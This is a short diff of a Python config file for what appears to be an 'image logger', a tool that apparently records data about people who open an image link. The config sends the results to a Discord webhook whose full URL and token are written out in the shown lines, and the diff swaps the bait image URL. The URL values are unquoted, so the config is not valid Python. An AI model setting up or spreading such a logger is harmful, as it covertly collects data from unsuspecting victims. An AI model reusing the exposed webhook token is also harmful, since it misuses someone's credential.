@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": https://discord.com/api/webhooks/1502991786065264741/HJ5-Frtivd1_YQmoKkJkIwg-uxi1yEJcrB88r_MPfTVQ6wUoyJGhKIahoKZiZXXeIKfO
-    "image": https://www.google.com/search?client=firefox-b-d&hs=mwW&sca_esv=8aa21ef7495b70c7&sxsrf=ANbL-n53iQVTD_tLLrDKV05mkV069ZicrA:1778414390861&udm=2&fbs=ADc_l-bfAIefFokrCf7F9QG8l3URO-z5Eo_AMH5Oufjv_O9BJt9PIYE-Ufw8IK4sAEsyC5wiAKpoqt43ofSXhff9xZCj8aFUjhDzNU496UqFFAW4t9o0PFtJSN8xVr_WL71GTgpgh2Z7wmv9FdxiXmT2Z1L47zWe4BNBqYCFqdYp3-pB7lk-i61CYIHOiyRHntEQeh3W1GfZ-QdMBjmqFOZ8XR_b3UJIgw&q=find+picture&sa=X&ved=2ahUKEwjilp_w1a6UAxXi0QIHHe6eLagQtKgLegQIIRAB&biw=1366&bih=635&dpr=1#sv=CAMSVhoyKhBlLTgzX0RzWFotQzN0TXlNMg44M19Ec1haLUMzdE15TToOQkxiZlNtVERzRE1PRE0gBCocCgZtb3NhaWMSEGUtODNfRHNYWi1DM3RNeU0YADABGAcgm9GkuApKCBABGAEgASgB # You can also have a custom image by using a URL argument
+    "image": https://www.google.com/search?client=firefox-b-d&hs=mzW&sca_esv=ecde0f1282fdfed1&sxsrf=ANbL-n43tBYGdDD8CXAXH8W1lm7XlNCQXQ:1778425505325&udm=2&fbs=ADc_l-bfAIefFokrCf7F9QG8l3URO-z5Eo_AMH5Oufjv_O9BJt9PIYE-Ufw8IK4sAEsyC5wiAKpoqt43ofSXhff9xZCj8aFUjhDzNU496UqFFAW4t9o0PFtJSN8xVr_WL71GTgpgh2Z7wmv9FdxiXmT2Z1L47zWe4BNBqYCFqdYp3-pB7lk-i61CYIHOiyRHntEQeh3W1GfZ-QdMBjmqFOZ8XR_b3UJIgw&q=find+picture&sa=X&ved=2ahUKEwiNkYSk_66UAxVn_7sIHXtHKSsQtKgLegQIFhAB&biw=1366&bih=635&dpr=1#sv=CAMSVhoyKhBlLTgzX0RzWFotQzN0TXlNMg44M19Ec1haLUMzdE15TToOQkxiZlNtVERzRE1PRE0gBCocCgZtb3NhaWMSEGUtODNfRHNYWi1DM3RNeU0YADABGAcgm9GkuApKCBABGAEgASgB
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
